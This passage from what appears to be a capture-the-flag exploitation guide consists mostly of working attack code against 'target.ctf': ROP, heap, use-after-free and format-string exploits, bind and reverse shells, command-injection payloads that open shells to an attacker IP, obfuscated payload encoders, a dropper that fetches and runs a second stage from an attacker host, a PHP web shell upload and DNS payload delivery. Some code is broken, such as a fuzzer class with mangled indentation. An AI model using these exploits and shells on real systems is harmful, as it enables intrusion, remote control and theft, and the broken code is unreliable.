    # Receive leaked address
    data = sock.recv(4096)
    leaked = u64(data[:8])
    
    log.success(f'Leaked address: {hex(leaked)}')
    
    # Keep socket open for stage 2
    return sock, leaked

def stage2_exploit(sock, leaked_addr):
    """Stage 2: Exploitation with leaked data"""
    libc_base = leaked_addr - 0x12345  # Calculate offset
    system_addr = libc_base + 0x50d60
    
    # Build ROP chain
    payload = flat(
        b'B' * 72,
        system_addr,
        0x0,
        libc_base + 0x1b75aa  # "/bin/sh"
    )
    
    sock.send(payload)
    
    # Interact with shell
    import time
    time.sleep(0.5)
    sock.send(b'cat flag.txt\n')
    flag = sock.recv(4096)
    
    return flag

# Execute staged exploitation
sock, leaked = stage1_leak('target.ctf', 1337)
flag = stage2_exploit(sock, leaked)
print(flag)
```

**Bind Shell Socket**:

```python
#!/usr/bin/env python3
import socket
import subprocess
import os

def bind_shell(port):
    """Create bind shell listening on port"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    
    print(f'[*] Bind shell on port {port}')
    
    while True:
        client, address = server.accept()
        print(f'[*] Connection from {address}')
        
        # Spawn shell
        proc = subprocess.Popen(['/bin/bash', '-i'],
                                stdin=client.fileno(),
                                stdout=client.fileno(),
                                stderr=client.fileno())
        proc.wait()
        client.close()

# Minimal bind shell (for shellcode)
def minimal_bind_shell(port):
    """Minimal bind shell implementation"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', port))
    s.listen(1)
    c, a = s.accept()
    os.dup2(c.fileno(), 0)
    os.dup2(c.fileno(), 1)
    os.dup2(c.fileno(), 2)
    os.system('/bin/sh')
```

**Reverse Shell Socket**:

```python
#!/usr/bin/env python3
import socket
import subprocess
import os

def reverse_shell(attacker_ip, attacker_port):
    """Create reverse shell to attacker"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((attacker_ip, attacker_port))
    
    # Redirect stdin/stdout/stderr to socket
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    
    # Spawn shell
    subprocess.call(['/bin/bash', '-i'])

# Listener on attacker machine
def reverse_shell_listener(port):
    """Listen for reverse shell connections"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(1)
    
    print(f'[*] Listening for reverse shell on port {port}')
    
    client, address = server.accept()
    print(f'[*] Reverse shell from {address}')
    
    # Interactive shell
    import select
    while True:
        readable, _, _ = select.select([client, sys.stdin], [], [])
        
        for sock in readable:
            if sock == client:
                data = client.recv(4096)
                if not data:
                    return
                sys.stdout.write(data.decode())
                sys.stdout.flush()
            else:
                data = sys.stdin.readline()
                client.send(data.encode())
```

---

## Network Protocol Analysis

### Packet Capture and Analysis

**Scapy Basics**:

```python
#!/usr/bin/env python3
from scapy.all import *

def capture_packets(interface='eth0', count=10):
    """Capture packets with Scapy"""
    packets = sniff(iface=interface, count=count)
    
    for packet in packets:
        print(packet.summary())
        
        if packet.haslayer(TCP):
            print(f'  TCP: {packet[TCP].sport} -> {packet[TCP].dport}')
        
        if packet.haslayer(Raw):
            print(f'  Payload: {packet[Raw].load}')
    
    return packets

def filter_packets(pcap_file, filter_rule):
    """Filter packets from pcap file"""
    packets = rdpcap(pcap_file)
    
    # Apply BPF filter
    filtered = [p for p in packets if filter_rule(p)]
    
    return filtered

# Example filters
def http_packets(packet):
    """Filter HTTP packets"""
    return packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80)

def contains_string(packet, search_string):
    """Filter packets containing string"""
    if packet.haslayer(Raw):
        return search_string.encode() in packet[Raw].load
    return False

# Usage
packets = capture_packets('eth0', 100)
http = filter_packets('capture.pcap', http_packets)
```

**Packet Crafting**:

```python
#!/usr/bin/env python3
from scapy.all import *

def craft_tcp_packet(src_ip, dst_ip, src_port, dst_port, payload):
    """Craft custom TCP packet"""
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port, flags='S')  # SYN packet
    packet = ip/tcp/payload
    
    return packet

def send_custom_packet(packet):
    """Send crafted packet"""
    # Layer 3 send
    send(packet)
    
    # Layer 2 send (with Ethernet)
    sendp(Ether()/packet)
    
    # Send and receive response
    response = sr1(packet, timeout=2)
    
    return response

# TCP SYN scan
def tcp_syn_scan(target, ports):
    """Perform TCP SYN scan"""
    results = {}
    
    for port in ports:
        packet = IP(dst=target)/TCP(dport=port, flags='S')
        response = sr1(packet, timeout=1, verbose=0)
        
        if response:
            if response.haslayer(TCP):
                if response[TCP].flags == 0x12:  # SYN-ACK
                    results[port] = 'open'
                    # Send RST to close connection
                    rst = IP(dst=target)/TCP(dport=port, flags='R')
                    send(rst, verbose=0)
                elif response[TCP].flags == 0x14:  # RST-ACK
                    results[port] = 'closed'
        else:
            results[port] = 'filtered'
    
    return results

# Usage
ports = [21, 22, 80, 443, 1337, 8080]
scan_results = tcp_syn_scan('192.168.1.100', ports)
print(scan_results)
```

**Protocol Dissection**:

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_http(packet):
    """Analyze HTTP packet"""
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        if 'HTTP' in payload:
            lines = payload.split('\r\n')
            
            # Parse HTTP request/response
            if payload.startswith('GET') or payload.startswith('POST'):
                method, path, version = lines[0].split()
                print(f'[*] HTTP Request: {method} {path}')
                
                # Extract headers
                for line in lines[1:]:
                    if ':' in line:
                        header, value = line.split(':', 1)
                        print(f'    {header}: {value.strip()}')
            
            elif payload.startswith('HTTP/'):
                version, status, message = lines[0].split(' ', 2)
                print(f'[*] HTTP Response: {status} {message}')

def extract_credentials(pcap_file):
    """Extract credentials from pcap"""
    packets = rdpcap(pcap_file)
    credentials = []
    
    for packet in packets:
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            
            # Check for basic auth
            if b'Authorization: Basic' in payload:
                import base64
                auth_line = [l for l in payload.split(b'\r\n') if b'Authorization' in l][0]
                encoded = auth_line.split(b' ')[2]
                decoded = base64.b64decode(encoded)
                credentials.append(('HTTP Basic Auth', decoded))
            
            # Check for POST credentials
            if b'password=' in payload.lower() or b'user=' in payload.lower():
                credentials.append(('Form Data', payload))
    
    return credentials
```

**TCP Stream Reconstruction**:

```python
#!/usr/bin/env python3
from scapy.all import *

def reconstruct_tcp_stream(packets, src_ip, dst_ip, src_port, dst_port):
    """Reconstruct TCP stream from packets"""
    stream_packets = []
    
    for packet in packets:
        if packet.haslayer(TCP) and packet.haslayer(IP):
            if (packet[IP].src == src_ip and packet[IP].dst == dst_ip and
                packet[TCP].sport == src_port and packet[TCP].dport == dst_port):
                stream_packets.append(packet)
    
    # Sort by sequence number
    stream_packets.sort(key=lambda p: p[TCP].seq)
    
    # Concatenate payload
    stream_data = b''
    for packet in stream_packets:
        if packet.haslayer(Raw):
            stream_data += packet[Raw].load
    
    return stream_data

def follow_tcp_stream(pcap_file, stream_index=0):
    """Follow TCP stream (similar to Wireshark)"""
    packets = rdpcap(pcap_file)
    
    # Find TCP streams
    streams = {}
    for packet in packets:
        if packet.haslayer(TCP) and packet.haslayer(IP):
            stream_id = (packet[IP].src, packet[IP].dst, 
                        packet[TCP].sport, packet[TCP].dport)
            
            if stream_id not in streams:
                streams[stream_id] = []
            streams[stream_id].append(packet)
    
    # Get specified stream
    stream_keys = list(streams.keys())
    if stream_index < len(stream_keys):
        selected_stream = streams[stream_keys[stream_index]]
        data = reconstruct_tcp_stream(selected_stream, *stream_keys[stream_index])
        return data
    
    return None
```

### Protocol-Specific Analysis

**DNS Analysis**:

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_dns(pcap_file):
    """Analyze DNS traffic"""
    packets = rdpcap(pcap_file)
    queries = {}
    
    for packet in packets:
        if packet.haslayer(DNS):
            if packet[DNS].qr == 0:  # Query
                query = packet[DNS].qd.qname.decode()
                queries[query] = []
            
            elif packet[DNS].qr == 1:  # Response
                if packet[DNS].ancount > 0:
                    query = packet[DNS].qd.qname.decode()
                    for i in range(packet[DNS].ancount):
                        answer = packet[DNS].an[i]
                        if hasattr(answer, 'rdata'):
                            queries[query].append(answer.rdata)
    
    return queries

def dns_exfiltration_detect(pcap_file, domain):
    """Detect DNS exfiltration"""
    packets = rdpcap(pcap_file)
    suspicious = []
    
    for packet in packets:
        if packet.haslayer(DNS) and packet[DNS].qr == 0:
            query = packet[DNS].qd.qname.decode()
            
            # Check for exfiltration patterns
            if domain in query:
                subdomain = query.replace(f'.{domain}', '')
                
                # Long subdomain = potential data exfiltration
                if len(subdomain) > 50:
                    suspicious.append({
                        'query': query,
                        'length': len(subdomain),
                        'timestamp': packet.time
                    })
    
    return suspicious
```

**TLS/SSL Analysis**:

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_tls(pcap_file):
    """Analyze TLS handshakes"""
    packets = rdpcap(pcap_file)
    handshakes = []
    
    for packet in packets:
        if packet.haslayer(TCP):
            # Check for TLS handshake (heuristic)
            if packet.haslayer(Raw):
                data = packet[Raw].load
                
                # TLS record starts with \x16\x03
                if len(data) > 5 and data[0] == 0x16:
                    tls_version = (data[1], data[2])
                    record_length = (data[3] << 8) | data[4]
                    
                    handshakes.append({
                        'src': packet[IP].src,
                        'dst': packet[IP].dst,
                        'version': tls_version,
                        'length': record_length
                    })
    
    return handshakes

def extract_sni(pcap_file):
    """Extract SNI from TLS ClientHello"""
    packets = rdpcap(pcap_file)
    sni_list = []
    
    for packet in packets:
        if packet.haslayer(Raw):
            data = packet[Raw].load
            
            # Look for SNI extension in ClientHello
            # This is simplified - real implementation would parse TLS properly
            if b'\x00\x00' in data:  # SNI extension type
                # Extract hostname (simplified)
                try:
                    idx = data.find(b'\x00\x00')
                    if idx != -1:
                        # Parse extension length and extract hostname
                        # [Inference] - Actual TLS parsing is more complex
                        pass
                except:
                    pass
    
    return sni_list
```

**HTTP/2 and WebSocket Analysis**:

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_websocket(packet):
    """Analyze WebSocket frames"""
    if packet.haslayer(Raw):
        data = packet[Raw].load
        
        # WebSocket frame structure
        if len(data) >= 2:
            fin = (data[0] & 0x80) >> 7
            opcode = data[0] & 0x0F
            masked = (data[1] & 0x80) >> 7
            payload_len = data[1] & 0x7F
            
            opcodes = {
                0x0: 'continuation',
                0x1: 'text',
                0x2: 'binary',
                0x8: 'close',
                0x9: 'ping',
                0xA: 'pong'
            }
            
            print(f'[*] WebSocket Frame:')
            print(f'    FIN: {fin}')
            print(f'    Opcode: {opcodes.get(opcode, "unknown")}')
            print(f'    Masked: {masked}')
            print(f'    Payload Length: {payload_len}')
            
            # Extract payload (simplified)
            offset = 2
            if payload_len == 126:
                offset = 4
            elif payload_len == 127:
                offset = 10
            
            if masked:
                mask_key = data[offset:offset+4]
                offset += 4
                payload = data[offset:]
                
                # Unmask payload
                decoded = bytearray()
                for i, byte in enumerate(payload):
                    decoded.append(byte ^ mask_key[i % 4])
                
                return bytes(decoded)
            else:
                return data[offset:]
    
    return None
```

### Network Protocol Fuzzing

**TCP Fuzzer**:

```python
#!/usr/bin/env python3
import socket
import random

def fuzz_tcp_service(host, port, num_iterations=100):
    """Fuzz TCP service with random data"""
    for i in range(num_iterations):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, port))
            
            # Generate random payload
            payload_size = random.randint(1, 4096)
            payload = bytes([random.randint(0, 255) for _ in range(payload_size)])
            
            print(f'[*] Iteration {i}: Sending {payload_size} bytes')
            sock.send(payload)
            
            # Try to receive response
            try:
                response = sock.recv(4096)
                print(f'    Response: {len(response)} bytes')
            except socket.timeout:
                print('    No response (timeout)')
            
            sock.close()
        
        except Exception as e:
            print(f'[!] Exception: {e}')
        
        time.sleep(0.1)

def smart_fuzzer(host, port, template):
    """Smart fuzzer with mutation strategy"""
    mutations = [
        lambda d: d + b'\x00' * 100,  # Null bytes
        lambda d: d + b'A' * 1000,     # Buffer overflow
        lambda d: d.replace(b'\n', b'\n' * 100),  # Newline injection
        lambda d: d + b'%s%s%s%s',     # Format string
        lambda d: d + b'../' * 50,     # Path traversal
    ]
    
    for mutation in mutations:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            payload = mutation(template)
            print(f'[*] Testing mutation: {len(payload)} bytes')
            
            sock.send(payload)
            response = sock.recv(4096)
            
            sock.close()
        except Exception as e:
            print(f'[!] Crash detected: {e}')
```

**Protocol State Fuzzer**:

```python
#!/usr/bin/env python3
import socket

class ProtocolFuzzer:
    """State-aware protocol fuzzer"""
    
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.state = 'INIT'
        self.sock = None
    
    def connect(self):
        """Establish connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.state = 'CONNECTED'
    
    def send_valid_sequence(self):
        """Send valid protocol sequence"""
        sequences = {
            'CONNECTED': [b'USER admin\r\n', b'PASS password\r\n'],
            'AUTHENTICATED': [b'LIST\r\n', b'RETRfile.txt\r\n'], }

    if self.state in sequences:
        for cmd in sequences[self.state]:
            self.sock.send(cmd)
            response = self.sock.recv(4096)
            print(f'[*] Response: {response[:50]}')
    
    self.state = 'AUTHENTICATED'

def fuzz_current_state(self):
    """Fuzz commands valid in current state"""
    fuzz_patterns = [
        b'A' * 1000,
        b'%s' * 100,
        b'\x00' * 500,
        b'../' * 100,
        b'-1',
        b'9999999999',
    ]
    
    commands = {
        'AUTHENTICATED': [b'LIST', b'RETR', b'DELE', b'STOR'],
    }
    
    if self.state in commands:
        for cmd in commands[self.state]:
            for pattern in fuzz_patterns:
                try:
                    payload = cmd + b' ' + pattern + b'\r\n'
                    self.sock.send(payload)
                    response = self.sock.recv(4096)
                    print(f'[*] Sent: {cmd} + {len(pattern)} fuzz bytes')
                except Exception as e:
                    print(f'[!] Crash: {e}')
                    self.connect()

def run(self):
    """Execute fuzzing campaign"""
    self.connect()
    self.send_valid_sequence()
    self.fuzz_current_state()

# Usage

fuzzer = ProtocolFuzzer('target.ctf', 21) 
fuzzer.run()
````

---

## Remote Code Execution Techniques

### Stack-based RCE over Network

**Remote Buffer Overflow**:
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vulnerable_server')
context.arch = 'amd64'

def remote_buffer_overflow():
    """Exploit remote buffer overflow"""
    io = remote('target.ctf', 1337)
    
    # Leak canary if present
    io.recvuntil(b'Enter name: ')
    io.sendline(b'%11$p')  # Example format string leak
    io.recvuntil(b'0x')
    canary = int(io.recv(16), 16)
    log.success(f'Canary: {hex(canary)}')
    
    # Build exploit payload
    rop = ROP(elf)
    rop.call('system', [next(elf.search(b'/bin/sh'))])
    
    payload = flat(
        b'A' * 104,      # Padding to canary
        canary,          # Preserve canary
        b'B' * 8,        # Saved RBP
        rop.chain()      # ROP chain
    )
    
    io.recvuntil(b'Input: ')
    io.sendline(payload)
    
    # Interact with shell
    io.interactive()

remote_buffer_overflow()
````

**Ret2libc over Network**:

```python
#!/usr/bin/env python3
from pwn import *

def remote_ret2libc(host, port):
    """Remote ret2libc exploitation"""
    io = remote(host, port)
    elf = ELF('./server_binary')
    
    # Stage 1: Leak libc address
    rop1 = ROP(elf)
    rop1.call(elf.plt['puts'], [elf.got['puts']])
    rop1.call(elf.symbols['main'])  # Loop back
    
    payload1 = flat(
        b'A' * 72,
        rop1.chain()
    )
    
    io.sendlineafter(b'> ', payload1)
    io.recvline()
    
    leaked_puts = u64(io.recv(6).ljust(8, b'\x00'))
    log.success(f'Leaked puts: {hex(leaked_puts)}')
    
    # Calculate libc base
    libc = ELF('./libc.so.6')
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f'Libc base: {hex(libc.address)}')
    
    # Stage 2: Execute shell
    rop2 = ROP(libc)
    binsh = next(libc.search(b'/bin/sh'))
    rop2.call(libc.symbols['system'], [binsh])
    
    payload2 = flat(
        b'A' * 72,
        rop2.chain()
    )
    
    io.sendlineafter(b'> ', payload2)
    io.interactive()

remote_ret2libc('target.ctf', 1337)
```

### Heap-based RCE over Network

**Remote Heap Overflow**:

```python
#!/usr/bin/env python3
from pwn import *

def remote_heap_exploit(host, port):
    """Exploit remote heap vulnerability"""
    io = remote(host, port)
    
    # Heap grooming phase
    log.info('Grooming heap...')
    for i in range(10):
        io.sendlineafter(b'Choice: ', b'1')  # Allocate
        io.sendlineafter(b'Size: ', b'256')
    
    # Create specific layout
    for i in range(7):
        io.sendlineafter(b'Choice: ', b'2')  # Free
        io.sendlineafter(b'Index: ', str(i).encode())
    
    # Leak heap address
    io.sendlineafter(b'Choice: ', b'3')  # Show
    io.sendlineafter(b'Index: ', b'7')
    io.recvuntil(b'Data: ')
    
    heap_leak = u64(io.recv(6).ljust(8, b'\x00'))
    heap_base = heap_leak - 0x290
    log.success(f'Heap base: {hex(heap_base)}')
    
    # Tcache poisoning
    target_addr = heap_base + 0x10  # Target location
    
    io.sendlineafter(b'Choice: ', b'2')  # Free
    io.sendlineafter(b'Index: ', b'8')
    
    io.sendlineafter(b'Choice: ', b'4')  # Edit
    io.sendlineafter(b'Index: ', b'8')
    io.sendlineafter(b'Data: ', p64(target_addr))
    
    # Allocate to target
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'Size: ', b'256')
    
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'Size: ', b'256')
    
    # Write to target location
    io.sendlineafter(b'Choice: ', b'4')
    io.sendlineafter(b'Index: ', b'10')
    io.sendlineafter(b'Data: ', p64(0xdeadbeef))
    
    io.interactive()

remote_heap_exploit('target.ctf', 1337)
```

**Remote Use-After-Free**:

```python
#!/usr/bin/env python3
from pwn import *

def remote_uaf_exploit(host, port):
    """Exploit remote UAF vulnerability"""
    io = remote(host, port)
    libc = ELF('./libc.so.6')
    
    # Allocate object with vtable
    io.sendlineafter(b'> ', b'1')  # New object
    io.sendlineafter(b'Name: ', b'victim')
    
    # Trigger UAF
    io.sendlineafter(b'> ', b'2')  # Delete
    io.sendlineafter(b'ID: ', b'0')
    
    # Object is freed but pointer retained
    # Allocate same size to reclaim chunk
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Name: ', b'A' * 8)
    
    # Now we control the freed object's memory
    # Leak libc via controlled object
    io.sendlineafter(b'> ', b'3')  # Show
    io.sendlineafter(b'ID: ', b'0')
    
    io.recvuntil(b'Data: ')
    leaked = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leaked - 0x3c5600  # Example offset
    log.success(f'Libc base: {hex(libc.address)}')
    
    # Overwrite vtable pointer
    io.sendlineafter(b'> ', b'4')  # Edit
    io.sendlineafter(b'ID: ', b'0')
    
    fake_vtable = libc.symbols['system']
    io.sendlineafter(b'Data: ', p64(fake_vtable))
    
    # Trigger virtual function call
    io.sendlineafter(b'> ', b'5')  # Call method
    io.sendlineafter(b'ID: ', b'0')
    io.sendlineafter(b'Arg: ', b'/bin/sh\x00')
    
    io.interactive()

remote_uaf_exploit('target.ctf', 1337)
```

### Format String RCE over Network

**Remote Format String Exploitation**:

```python
#!/usr/bin/env python3
from pwn import *

def remote_format_string(host, port):
    """Exploit remote format string vulnerability"""
    io = remote(host, port)
    elf = ELF('./server')
    
    # Find format string offset
    def find_offset():
        for i in range(1, 20):
            io.sendlineafter(b'Input: ', f'AAAA%{i}$p'.encode())
            response = io.recvline()
            if b'41414141' in response or b'0x41414141' in response:
                log.success(f'Format string offset: {i}')
                return i
        return None
    
    offset = find_offset()
    
    # Leak stack/PIE addresses
    io.sendlineafter(b'Input: ', f'%{offset+5}$p'.encode())
    io.recvuntil(b'0x')
    stack_leak = int(io.recvline().strip(), 16)
    log.success(f'Stack leak: {hex(stack_leak)}')
    
    # Arbitrary write primitive
    target = elf.got['exit']  # Overwrite GOT entry
    value = elf.symbols['win']  # Target function
    
    payload = fmtstr_payload(offset, {target: value})
    
    io.sendlineafter(b'Input: ', payload)
    
    # Trigger overwritten function
    io.sendlineafter(b'Choice: ', b'4')  # Exit
    
    io.interactive()

remote_format_string('target.ctf', 1337)
```

**Multi-stage Format String Attack**:

```python
#!/usr/bin/env python3
from pwn import *

def advanced_format_string(host, port):
    """Multi-stage format string exploitation"""
    io = remote(host, port)
    elf = ELF('./vulnerable')
    
    # Stage 1: Leak libc
    payload1 = b'%3$s.AAA' + p64(elf.got['puts'])
    io.sendlineafter(b'> ', payload1)
    
    leaked = io.recvuntil(b'.AAA')[:-4]
    leaked_puts = u64(leaked.ljust(8, b'\x00'))
    
    libc = ELF('./libc.so.6')
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f'Libc: {hex(libc.address)}')
    
    # Stage 2: Overwrite __free_hook
    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']
    
    # Write address in multiple parts (byte by byte)
    writes = {
        free_hook: system & 0xFFFF,
        free_hook + 2: (system >> 16) & 0xFFFF,
        free_hook + 4: (system >> 32) & 0xFFFF,
    }
    
    payload2 = fmtstr_payload(6, writes, write_size='short')
    io.sendlineafter(b'> ', payload2)
    
    # Stage 3: Trigger hook with /bin/sh
    io.sendlineafter(b'> ', b'3')  # Allocate
    io.sendlineafter(b'Data: ', b'/bin/sh\x00')
    
    io.sendlineafter(b'> ', b'4')  # Free (triggers system("/bin/sh"))
    io.interactive()

advanced_format_string('target.ctf', 1337)
```

### Command Injection RCE

**Remote Command Injection**:

```python
#!/usr/bin/env python3
from pwn import *
import requests

def command_injection_http(url):
    """HTTP-based command injection"""
    # Test for command injection
    test_payloads = [
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '&& id',
    ]
    
    for payload in test_payloads:
        response = requests.post(url, data={'input': payload})
        if 'uid=' in response.text:
            log.success(f'Command injection works with: {payload}')
            return payload[0]  # Return injection character
    
    return None

def exploit_command_injection(url, inject_char):
    """Exploit command injection for RCE"""
    # Reverse shell payload
    attacker_ip = '10.10.10.10'
    attacker_port = 4444
    
    payloads = [
        f'{inject_char} bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1',
        f'{inject_char} nc {attacker_ip} {attacker_port} -e /bin/bash',
        f'{inject_char} python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{attacker_ip}\',{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"',
    ]
    
    # Try each payload
    for payload in payloads:
        log.info(f'Trying: {payload[:50]}...')
        try:
            requests.post(url, data={'input': payload}, timeout=2)
        except requests.exceptions.Timeout:
            log.success('Payload sent, check listener!')
            return True
    
    return False

# Setup listener first:
# nc -lvnp 4444

url = 'http://target.ctf/execute'
inject_char = command_injection_http(url)
if inject_char:
    exploit_command_injection(url, inject_char)
```

**Blind Command Injection with Time Delays**:

```python
#!/usr/bin/env python3
import requests
import time

def blind_command_injection(url):
    """Detect blind command injection via timing"""
    # Test with sleep command
    payload = '; sleep 5'
    
    start = time.time()
    requests.post(url, data={'input': payload}, timeout=10)
    elapsed = time.time() - start
    
    if elapsed >= 4.5:
        log.success('Blind command injection confirmed!')
        return True
    
    return False

def exfil_via_time(url, command):
    """Exfiltrate data via timing side channel"""
    result = ""
    
    for pos in range(1, 50):
        for char in range(32, 127):
            # Test if character at position matches
            test_cmd = f'[ $(cat flag.txt | cut -c{pos}) = {chr(char)} ] && sleep 2'
            payload = f'; {test_cmd}'
            
            start = time.time()
            try:
                requests.post(url, data={'input': payload}, timeout=3)
            except:
                pass
            elapsed = time.time() - start
            
            if elapsed >= 1.5:
                result += chr(char)
                log.info(f'Found: {result}')
                break
        else:
            break  # No more characters
    
    return result

url = 'http://target.ctf/ping'
if blind_command_injection(url):
    flag = exfil_via_time(url, 'cat flag.txt')
    log.success(f'Flag: {flag}')
```

---

## Exploit Delivery over Network

### Payload Encoding and Obfuscation

**URL Encoding**:

```python
#!/usr/bin/env python3
import urllib.parse

def url_encode_payload(payload):
    """URL encode exploit payload"""
    encoded = urllib.parse.quote(payload)
    return encoded

def double_url_encode(payload):
    """Double URL encoding for bypass"""
    encoded = urllib.parse.quote(urllib.parse.quote(payload))
    return encoded

# Example
payload = "../../../etc/passwd"
encoded = url_encode_payload(payload)
print(f'Encoded: {encoded}')
# Output: ..%2F..%2F..%2Fetc%2Fpasswd

double = double_url_encode(payload)
print(f'Double: {double}')
# Output: ..%252F..%252F..%252Fetc%252Fpasswd
```

**Base64 Encoding**:

```python
#!/usr/bin/env python3
import base64

def base64_payload(command):
    """Encode command in base64"""
    encoded = base64.b64encode(command.encode()).decode()
    wrapper = f'echo {encoded} | base64 -d | bash'
    return wrapper

def base64_reverse_shell(attacker_ip, port):
    """Base64 encoded reverse shell"""
    cmd = f'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'
    return base64_payload(cmd)

# Usage
payload = base64_reverse_shell('10.10.10.10', 4444)
print(payload)
# Can be used in command injection: ; eval $(echo {payload})
```

**Hex Encoding**:

```python
#!/usr/bin/env python3

def hex_encode_payload(data):
    """Hex encode payload"""
    return data.hex()

def hex_shellcode_delivery():
    """Deliver shellcode as hex string"""
    shellcode = asm(shellcraft.sh())
    hex_shellcode = shellcode.hex()
    
    # Decode and execute on target
    decoder = f'''python3 -c "exec(bytes.fromhex('{hex_shellcode}'))"'''
    return decoder

# For injection: ; python3 -c "exec(bytes.fromhex('...'))"
```

**XOR Encoding**:

```python
#!/usr/bin/env python3

def xor_encode(data, key):
    """XOR encode payload"""
    encoded = bytearray()
    for i, byte in enumerate(data):
        encoded.append(byte ^ key[i % len(key)])
    return bytes(encoded)

def xor_payload_delivery(payload, key=b'\x42'):
    """Create XOR encoded payload with decoder"""
    encoded = xor_encode(payload, key)
    
    decoder_stub = f'''
import sys
key = {key}
encoded = {encoded}
decoded = bytearray()
for i, byte in enumerate(encoded):
    decoded.append(byte ^ key[i % len(key)])
exec(bytes(decoded))
'''
    
    return decoder_stub
```

### Multi-stage Payload Delivery

**Staged Payload Architecture**:

```python
#!/usr/bin/env python3
from pwn import *

def stage1_dropper(target_host, target_port, attacker_host):
    """Stage 1: Minimal dropper"""
    dropper = f'''
import urllib.request
import os
code = urllib.request.urlopen('http://{attacker_host}:8000/stage2.py').read()
exec(code)
'''.encode()
    
    # Compress dropper
    import zlib
    compressed = zlib.compress(dropper)
    
    # Send to target
    io = remote(target_host, target_port)
    io.sendlineafter(b'> ', b'exec(__import__("zlib").decompress(' + str(compressed) + b'))')
    
    return io

def stage2_payload():
    """Stage 2: Full payload"""
    payload = '''
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker_ip', 4444))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(['/bin/bash', '-i'])
'''
    
    # Serve via HTTP
    with open('stage2.py', 'w') as f:
        f.write(payload)
    
    # python3 -m http.server 8000

# Usage
io = stage1_dropper('target.ctf', 1337, '10.10.10.10')
```

**Chunked Payload Transfer**:

```python
#!/usr/bin/env python3
from pwn import *

def chunked_payload_delivery(io, payload, chunk_size=100):
    """Deliver large payload in chunks"""
    # Write to temporary file in chunks
    io.sendline(b'rm -f /tmp/payload')
    
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i+chunk_size]
        
        # Base64 encode chunk for safety
        encoded = base64.b64encode(chunk).decode()
        
        # Append to file
        io.sendline(f'echo {encoded} | base64 -d >> /tmp/payload'.encode())
        io.recvuntil(b'$')
    
    # Make executable
    io.sendline(b'chmod +x /tmp/payload')
    
    # Execute
    io.sendline(b'/tmp/payload')
    
    return io

# Usage
shellcode = asm(shellcraft.sh())
io = remote('target.ctf', 1337)
chunked_payload_delivery(io, shellcode, chunk_size=50)
```

### Network-based Payload Delivery

**HTTP POST Delivery**:

```python
#!/usr/bin/env python3
import requests

def http_payload_delivery(url, payload):
    """Deliver payload via HTTP POST"""
    files = {
        'file': ('exploit.bin', payload, 'application/octet-stream')
    }
    
    response = requests.post(url + '/upload', files=files)
    
    if response.status_code == 200:
        # Trigger execution
        requests.get(url + '/execute?file=exploit.bin')

def http_multipart_exploit():
    """Exploit via multipart form data"""
    payload = b'<?php system($_GET["cmd"]); ?>'
    
    files = {
        'upload': ('shell.php', payload, 'image/jpeg')  # MIME type confusion
    }
    
    response = requests.post('http://target.ctf/upload.php', files=files)
    
    if 'success' in response.text:
        # Execute commands
        cmd_response = requests.get('http://target.ctf/uploads/shell.php?cmd=id')
        print(cmd_response.text)
```

**DNS-based Payload Delivery**:

```python
#!/usr/bin/env python3
import socket
import base64

def dns_payload_delivery(payload, domain='attacker.com'):
    """Deliver payload via DNS TXT records"""
    # Encode payload in base64
    encoded = base64.b64encode(payload).decode()
    
    # Split into DNS label-sized chunks (63 chars)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    # Recipient queries DNS TXT records
    # dig TXT stage1.attacker.com
    # dig TXT stage2.attacker.com
    # ...
    
    print('DNS TXT Records to create:')
    for i, chunk in enumerate(chunks):
        print(f'stage{i}.{domain} IN TXT "{chunk}"')
    
    # On target: reconstruct payload
    reconstruct_cmd = f'''
import socket
import base64
chunks = []
for i in range({len(chunks)}):
    result = socket.gethostbyname_ex(f'stage{{i}}.{domain}')
    # Parse TXT record (simplified)
    chunks.append(result)
payload = base64.b64decode(''.join(chunks))
exec(payload)
'''
    
    return reconstruct_cmd
```

**ICMP Tunnel Payload**:

```python
#!/usr/bin/env python3
from scapy.all import *

